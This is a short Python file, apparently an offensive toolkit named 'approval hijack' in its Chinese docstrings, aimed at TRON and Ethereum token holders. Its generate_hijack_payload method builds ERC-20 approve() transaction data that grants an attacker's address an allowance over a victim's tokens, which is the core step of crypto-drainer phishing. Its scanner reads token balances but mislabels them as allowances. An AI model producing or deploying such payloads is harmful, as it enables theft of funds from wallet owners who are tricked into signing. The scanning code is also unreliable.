#!/usr/bin/env python3
"""授权劫持"""
import requests
import json
from typing import Dict, List

class ApprovalHijack:
    """代币授权劫持"""

    def __init__(self):
        self.tron_api = "https://api.trongrid.io"
        self.eth_api = "https://api.etherscan.io/api"

    def scan_approvals_tron(self, address: str) -> List[Dict]:
        """扫描 TRON 授权"""
        approvals = []
        usdt_contract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

        try:
            url = f"{self.tron_api}/v1/accounts/{address}"
            resp = requests.get(url, timeout=10).json()

            if 'data' in resp and len(resp['data']) > 0:
                account = resp['data'][0]

                for token in account.get('trc20', []):
                    for contract, balance in token.items():
                        amount = int(balance)
                        if amount > 0:
                            approvals.append({
                                'contract': contract,
                                'allowance': amount / 1e6,
                                'risk': 'CRITICAL' if amount > 1e15 else 'HIGH' if amount > 1e12 else 'LOW',
                                'token': 'USDT' if contract == usdt_contract else 'UNKNOWN'
                            })
        except Exception as e:
            print(f"Scan error: {e}")

        return approvals

    def revoke_approval_tron(self, owner: str, spender: str, contract: str, private_key: str) -> str:
        """撤销授权 (需要私钥签名)"""
        return "需要离线签名交易"

    def generate_hijack_payload(self, victim: str, attacker: str, contract: str, amount: int) -> Dict:
        """生成授权劫持 Payload"""
        function_selector = "095ea7b3"
        spender_padded = attacker[2:].zfill(64)
        amount_padded = hex(amount)[2:].zfill(64)
        data = f"0x{function_selector}{spender_padded}{amount_padded}"

        return {
            'to': contract,
            'data': data,
            'from': victim,
            'value': 0
        }

    def monitor_mempool(self, callback=None):
        """监控内存池待授权交易"""
        pass
